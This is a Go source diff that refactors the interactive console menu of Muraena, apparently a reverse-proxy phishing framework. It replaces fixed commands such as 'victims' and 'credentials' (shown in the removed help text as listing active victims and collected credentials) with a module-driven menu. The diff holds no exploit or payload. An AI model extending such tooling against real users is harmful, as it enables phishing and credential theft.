@@ -27,6 +27,20 @@ func Prompt(s *Session) {
 			Success: "{{ . | bold }} ",
 		}
 
+		validate := func(input string) error {
+			input = strings.ToLower(input)
+
+			if core.StringContains(input, []string{"","h","help","e", "exit"}) {
+				return nil
+			}
+
+			if core.StringContains(input, s.GetModuleNames()) {
+				return nil
+			}
+
+			return errors.New(InvalidCommand)
+		}
+
 		prompt := promptui.Prompt{
 			Label:     ">",
 			Templates: templates,
@@ -41,45 +55,40 @@ func Prompt(s *Session) {
 			return
 		}
 
-		switch strings.ToLower(result) {
-		case "h", "help":
-			help()
-		case "exit":
-			exit()
-		case "victims", "credentials":
-			s.showTracking(result)
+		result = strings.ToLower(result)
 
-		case "watchdog":
-			s.Watchdog("")
+		// Module menu
+		if core.StringContains(result, s.GetModuleNames()) {
+			// Retrieve module's object
+			m, err := s.Module(result)
+			if err != nil {
+				log.Error("%s", err)
+				return
+			}
+
+			m.Prompt()
+
+		} else {
+
+			switch result {
+			case "h", "help":
+				s.help()
+			case "e", "exit":
+				exit()
+			}
 		}
-
 	}
 }
 
-func validate(input string) error {
-	switch strings.ToLower(input) {
-	case
-		"", "h",
-		"help",
-		"exit",
-		"victims", "credentials",
-		"watchdog":
-		return nil
-	}
-
-	return errors.New(InvalidCommand)
-}
-
-func help() {
+func (s *Session) help() {
 	log.Raw("**************************************************************************")
-	log.Raw("* NOTE: This feature is not fully implemented yet. ")
-	log.Raw("*       Follow evolutions on https://github.com/muraenateam/muraena/issues/5")
-	log.Raw("* Options")
-	log.Raw("* - help: %s", tui.Bold("Prints this help"))
-	log.Raw("* - exit: %s", tui.Bold("Exit from "+core.Name))
-	log.Raw("* - victims: %s", tui.Bold("Show active victims"))
-	log.Raw("* - credentials: %s", tui.Bold("Show collected credentials"))
-	log.Raw("* - watchdog: %s", tui.Bold("Interact with watchdog module"))
+	log.Raw("* Muraena menu")
+	log.Raw("* - h, help: %s", tui.Bold("Prints this help"))
+	log.Raw("* - e, exit: %s", tui.Bold("Exit from "+core.Name))
+	log.Raw("* Enabled modules:")
+	for _, m := range s.GetModuleNames() {
+		log.Raw("* - %s: %s", m, tui.Bold("Interact with "+m+" module"))
+	}
 	log.Raw("**************************************************************************")
 
 }
@@ -96,24 +105,19 @@ func exit() {
 	}
 }
 
-func (s *Session) showTracking(what string) {
+// DoModulePrompt generates a prompt for a specific module
+func DoModulePrompt(module string, items []string) (result string, err error) {
 
-	m, err := s.Module("tracker")
-	if err != nil {
-		log.Error("%s", err)
-		return
+	prompt := promptui.Select{
+		Label: module + " actions:",
+		Items: items,
 	}
+	_, result, err = prompt.Run()
+	result = strings.ToLower(result)
 
-	m.Prompt(what)
-}
+	//if core.IsError(err) {
+	//	log.Debug("%s prompt menu failed: %v.", module, err)
+	//}
 
-
-func (s *Session) Watchdog(what string) {
-	m, err := s.Module("watchdog")
-	if err != nil {
-		log.Error("%s", err)
-		return
-	}
-
-	m.Prompt(what)
+	return
 }
